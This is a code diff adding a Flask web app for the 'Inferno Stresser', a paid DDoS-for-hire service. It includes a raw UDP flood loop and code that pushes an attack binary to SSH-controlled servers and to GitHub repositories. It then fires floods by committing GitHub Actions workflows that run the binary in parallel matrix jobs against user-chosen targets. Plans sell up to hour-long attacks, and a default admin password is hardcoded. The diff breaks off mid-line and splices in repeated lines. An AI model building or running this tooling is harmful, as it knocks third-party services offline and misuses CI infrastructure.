@@ -21,7 +21,6 @@ app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))
 # ---------- MongoDB Connection with SSL Fix ----------
 MONGO_URL = os.environ.get("MONGO_URL")
 if not MONGO_URL:
-    # Fallback for local testing
     MONGO_URL = "mongodb://localhost:27017/"
     print("⚠️ MONGO_URL not set, using local MongoDB")
 
@@ -34,7 +33,503 @@ if "tlsAllowInvalidCertificates" not in MONGO_URL and "mongodb+srv://" in MONGO_
 
 try:
     client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
-    # Test connection
+    client.admin.command('ping')
+    db = client['stresser_db']
+    print("✅ MongoDB connected successfully")
+except Exception as e:
+    print(f"❌ MongoDB connection error: {e}")
+    db = None
+
+# Collections
+users_col = db['users'] if db else None
+api_keys_col = db['api_keys'] if db else None
+attack_logs_col = db['attack_logs'] if db else None
+attack_nodes_col = db['attack_nodes'] if db else None
+admin_users_col = db['admin_users'] if db else None
+
+# ---------- Captcha Helper ----------
+def generate_captcha():
+    a = random.randint(1, 10)
+    b = random.randint(1, 10)
+    op = random.choice(['+', '-'])
+    if op == '+':
+        answer = a + b
+        question = f"{a} + {b} = ?"
+    else:
+        if a < b:
+            a, b = b, a
+        answer = a - b
+        question = f"{a} - {b} = ?"
+    return question, answer
+
+# ---------- Proxy Management ----------
+PROXY_LIST = []
+LAST_PROXY_FETCH = 0
+
+def fetch_proxies():
+    global PROXY_LIST, LAST_PROXY_FETCH
+    urls = [
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+    ]
+    new_proxies = []
+    for url in urls:
+        try:
+            resp = requests.get(url, timeout=10)
+            lines = resp.text.splitlines()
+            proxies = [p.strip() for p in lines if ":" in p and p.strip()]
+            if proxies:
+                new_proxies.extend(proxies)
+        except:
+            continue
+    PROXY_LIST = list(set(new_proxies))
+    LAST_PROXY_FETCH = time.time()
+    print(f"[+] Loaded {len(PROXY_LIST)} proxies")
+
+def get_random_proxy():
+    if not PROXY_LIST:
+        fetch_proxies()
+    if PROXY_LIST:
+        return random.choice(PROXY_LIST)
+    return None
+
+fetch_proxies()
+
+# ---------- Database Initialisation ----------
+def init_db():
+    if not db:
+        print("⚠️ MongoDB not available, skipping init")
+        return
+    if admin_users_col.count_documents({}) == 0:
+        admin_users_col.insert_one({
+            "username": "admin",
+            "password_hash": generate_password_hash("admin123"),
+            "created_at": datetime.utcnow()
+        })
+        print("Default admin created: username 'admin', password 'admin123'")
+    if users_col.count_documents({}) == 0:
+        default_token = secrets.token_urlsafe(32)
+        users_col.insert_one({
+            "token": default_token,
+            "plan": "Free Plan",
+            "max_concurrent": 1,
+            "max_duration": 60,
+            "slots_used": 0,
+            "total_attacks": 0,
+            "created_at": datetime.utcnow()
+        })
+        print(f"Default user token: {default_token}")
+
+init_db()
+
+# ---------- Helper Functions ----------
+def generate_token():
+    return secrets.token_urlsafe(32)
+
+def get_user_by_token(token):
+    if not users_col:
+        return None
+    return users_col.find_one({"token": token})
+
+def admin_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'admin_logged_in' not in session or not session['admin_logged_in']:
+            flash('Please login as admin first', 'danger')
+            return redirect(url_for('admin_login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+# ---------- GitHub Helpers ----------
+def create_github_repository(token, repo_name="InfernoCore"):
+    try:
+        g = Github(token)
+        user = g.get_user()
+        try:
+            repo = user.get_repo(repo_name)
+            return repo, False
+        except GithubException:
+            repo = user.create_repo(
+                repo_name,
+                description="Inferno Stresser Repository",
+                private=False,
+                auto_init=False
+            )
+            return repo, True
+    except Exception as e:
+        raise Exception(f"Failed to create repository: {e}")
+
+def test_github_node(node):
+    try:
+        g = Github(node['github_token'])
+        user = g.get_user()
+        repo = g.get_repo(node['github_repo'])
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "online"}})
+        try:
+            repo.get_contents("soul")
+            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
+        except:
+            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": False}})
+        return True, "GitHub OK"
+    except Exception as e:
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "offline", "binary_present": False}})
+        return False, str(e)
+
+def test_vps_node(node):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        key_filename=node['vps_key_path'], timeout=5)
+        elif node.get('vps_password'):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        password=node['vps_password'], timeout=5)
+        else:
+            return False, "No authentication method"
+        stdin, stdout, stderr = ssh.exec_command("test -f /root/soul && echo 'exists'")
+        output = stdout.read().decode().strip()
+        ssh.close()
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "online"}})
+        binary_present = (output == 'exists')
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": binary_present}})
+        return True, "SSH OK" + (" (binary found)" if binary_present else " (binary missing)")
+    except Exception as e:
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "offline", "binary_present": False}})
+        return False, str(e)
+
+# ---------- Binary Distribution ----------
+def distribute_binary_to_github(node, binary_data):
+    try:
+        g = Github(node['github_token'])
+        repo = g.get_repo(node['github_repo'])
+        try:
+            contents = repo.get_contents("soul")
+            repo.update_file("soul", "Update binary", binary_data, contents.sha, branch="main")
+        except:
+            repo.create_file("soul", "Add binary", binary_data, branch="main")
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def distribute_binary_to_vps(node, binary_data):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        key_filename=node['vps_key_path'], timeout=10)
+        elif node.get('vps_password'):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        password=node['vps_password'], timeout=10)
+        else:
+            return False
+        sftp = ssh.open_sftp()
+        remote_path = "/root/soul"
+        try:
+            sftp.stat("/root")
+        except:
+            sftp.mkdir("/root")
+        with sftp.open(remote_path, 'wb') as f:
+            f.write(binary_data)
+        sftp.chmod(remote_path, 0o755)
+        sftp.close()
+        ssh.close()
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+# ---------- Attack Triggers ----------
+def trigger_github_node(node, target, port, duration, method):
+    binary_method = "udp"
+    matrix_size = 10
+    matrix_list = ','.join(str(i) for i in range(1, matrix_size+1))
+    yml_content = f"""name: Inferno Attack
+on: [push]
+
+jobs:
+  stage-0-init:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [{matrix_list}]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {target} {port} 10 {binary_method}
+
+  stage-1-main:
+    needs: stage-0-init
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [{matrix_list}]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {target} {port} {duration} {binary_method}
+
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
+    steps:
+      - id: calc
+        run: |
+          NUM_JOBS=$(({duration} / 10))
+          if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0-init, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {target} {port} 10 {binary_method}
+
+  stage-3-cleanup:
+    needs: [stage-1-main, stage-2-sequential]
+    runs-on: ubuntu-22.04
+    if: always()
+    steps:
+      - run: echo "Attack completed on $(date)"
+"""
+    try:
+        g = Github(node['github_token'])
+        repo = g.get_repo(node['github_repo'])
+        try:
+            contents = repo.get_contents(".github/workflows/main.yml")
+            repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
+        except:
+            repo.create_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content)
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def trigger_vps_node(node, target, port, duration, method):
+    binary_method = "udp"
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        key_filename=node['vps_key_path'], timeout=10)
+        elif node.get('vps_password'):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        password=node['vps_password'], timeout=10)
+        else:
+            return False
+        cmd = f"cd /root && ./soul {target} {port} {duration} {binary_method} > /dev/null 2>&1 &"
+        ssh.exec_command(cmd)
+        ssh.close()
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def run_local_python(target, port, duration, method):
+    end_time = time.time() + duration
+    packets = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
+    payload = random.randbytes(1024)
+    while time.time() < end_time:
+        sock.sendto(payload, (target, port))
+        packets += 1
+    sock.close()
+    return packets
+
+def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
+    if not attack_nodes_col:
+        packets = run_local_python(target, port, duration, method)
+        return
+    nodes = list(attack_nodes_col.find({"enabled": True}))
+    if not nodes:
+        packets = run_local_python(target, port, duration, method)
+        if attack_logs_col:
+            attack_logs_col.insert_one({
+                "user_id": user_id,
+                "target": target,
+                "port": port,
+                "duration": duration,
+                "method": method,
+                "concurrent": 1,
+                "status": "completed",
+                "timestamp": datetime.utcnow()
+            })
+        if user_id and users_col:
+            users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1, "slots_used": -1}})
+        return
+
+    if attack_logs_col:
+        log_id = attack_logs_col.insert_one({
+            "user_id": user_id,
+            "target": target,
+            "port": port,
+            "duration": duration,
+            "method": method,
+            "concurrent": len(nodes),
+            "status": "running",
+            "timestamp": datetime.utcnow()
+        }).inserted_id
+    if user_id and users_col:
+        users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1}})
+
+    threads = []
+    def worker(node):
+        if node['node_type'] == 'github':
+            trigger_github_node(node, target, port, duration, method)
+        else:
+            trigger_vps_node(node, target, port, duration, method)
+    for node in nodes:
+        t = threading.Thread(target=worker, args=(node,))
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+    if attack_logs_col and 'log_id' in locals():
+        attack_logs_col.update_one({"_id": log_id}, {"$set": {"status": "completed"}})
+
+# ---------- User Routes ----------
+@app.route('/')
+def index():
+    if 'user_token' in session:
+        return redirect(url_for('dashboard'))
+    return redirect(url_for('login'))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        token = request.form.get('token')
+        captcha_answer = request.form.get('captcha')
+        expected_answer = session.get('captcha_answer')
+        if not captcha_answer or not expected_answer or str(captcha_answer) != str(expected_answer):
+            flash('Invalid captcha. Please try again.', 'danger')
+            q, a = generate_captcha()
+            session['captcha_question'] = q
+            session['captcha_answer'] = a
+            return render_template_string(LOGIN_HTML, captcha_question=q)
+        user = get_user_by_token(token)
+        if user:
+            session['user_token'] = token
+            session['user_id'] = str(user['_id'])
+            flash('Logged in successfully', 'success')
+            return redirect(url_for('dashboard'))
+        flash('Invalid token', 'danger')
+    q, a = generate_captcha()
+    session['captcha_question'] = q
+    session['captcha_answer'] = a
+    return render_template_string(LOGIN_HTML, captcha_question=q)
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        captcha_answer = request.form.get('captcha')
+        expected_answer = session.get('captcha_answer')
+        if not captcha_answer or not expected_answer or str(captcha_answer) != str(expected_answer):
+            flash('Invalid captcha. Please try again.', 'danger')
+            q, a = generate_captcha()
+            session['captcha_question'] = q
+            session['captcha_answer'] = a
+            return render_template_string(REGISTER_HTML, captcha_question=q)
+        token = generate_token()
+        user = {
+            "token": token,
+            "plan": "Free Plan",
+            "max_concurrent": 1,
+            "max_duration": 60,
+            "slots_used": 0,
+            "total_attacks": 0,
+            "created_at": datetime.utcnow()
+        }
+        users_col.insert_one(user)
+        flash(f'Your access token: {token}', 'success')
+        return redirect(url_for('login'))
+    q, a = generate_captcha()
+    session['captcha_question'] = q
+    session['captcha_answer'] = a
+    return render_template_string(REGISTER_HTML, captcha_question=q)
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = users_col.find_one({"_id": ObjectId(session['user_id'])})
+    if not user:
+        session.clear()
+        return redirect(url_for('login'))
+    attacks = list(attack_logs_col.find({"user_id": session['user_id']}).sort("timestamp", -1).limit(10))
+    slots_used = user.get('slots_used', 0)
+    max_slots = user.get('max_concurrent', 1)
+    return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks,
+                                  slots_used=slots_used, max_slots=max_slots)
+
+@app.route('/attack', methods=['GET', 'POST'])
+def attack_page():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = users_col.find_one({"_id": ObjectId(session['user_id'])})
+    if request.method == 'POST':
+        target = request.form.get('target')
+        port = int(request.form.get('port'))
+        duration = int(request.form.get('duration'))
+        method = request.form.get('method', 'UDP')
+        concurrent = int(request.form.get('concurrent', 1))
+        if duration > user['max_duration']:
+            flash(f'Duration exceeds limit ({user["max_duration"]}s)', 'danger')
+            return redirect(url_for('attack_page'))
+        if concurrent > user['max_concurrent']:
+            flash(f'Concurrent exceeds limit ({user["max_concurrent"]})', 'danger')
+            return redirect(url_for('attack_page'))
+        if user.get('slots_used', 0) + concurrent > user['max_concurrent']:
+            flash('No free slots', 'danger')
+            return redirect(url_for('attack_page'))
+        users_col.update_one({"_id": user['_id']}, {"$inc": {"slots_used": concurrent}})
+        thread = threading.Thread(target=run_attack_on_nodes, args=(user['_id'], target, port, duration, method, 'web'))
+        thread.daemon = True
+        thread.start()
+        flash(f'Attack launched on {target}:{port} ({method})', 'success')
+        return redirect(url_for('attack_page'))
+    return render_template_string(ATTACK_HTML, user=user)
+
+@app.route('/products')
+def products_page():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = users_col.find_one({"_id": ObjectId(session['user_id'])})
+    plans = [
+        {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'methods': 'UDP Only', 'slots': 1},
+        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP Only', 'slots': 5},
+        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'methods': 'UDP Only', 'slots': 25},
+        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'methods': 'UDP Only', 'slots': 100}
+    ]
+    return render_template_string(PRODUCTS_HTML, user=user, plans=plans)
+
+@app.route('/api/attack', methods=['POST'])
+def api_attack():
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'Invalid JSON'}), 400
+    api_key = data.get('api_key')
+    target = data.get('target')
+    port = data.get('port')
+    duration = data.get('duration')
+    method = data.get('method', 'UDP')
+    concurrent = data.get('concurrent', 1)
+    if not api_key or not target or not port or not du    # Test connection
     client.admin.command('ping')
     db = client['stresser_db']
     print("✅ MongoDB connected successfully")
